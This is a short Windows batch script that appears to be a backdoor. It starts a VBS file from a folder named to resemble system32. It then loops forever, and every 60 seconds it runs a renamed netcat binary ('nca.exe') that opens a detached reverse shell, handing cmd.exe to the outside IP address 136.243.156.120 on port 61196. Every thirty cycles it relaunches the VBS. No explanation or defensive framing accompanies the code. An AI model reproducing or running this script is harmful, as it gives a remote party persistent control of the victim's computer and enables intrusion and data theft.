start C:\syse32\copper.vbs
set /A i=0
:loop

SET /A i = %i% + 1
echo "%i%"
IF /I "%i%" EQU "30" (
  set /A i=0
  start C:\syse32\copper.vbs
)
C:\syse32\nca.exe 136.243.156.120 61196 -d -e cmd.exe
timeout /t 60

goto loop



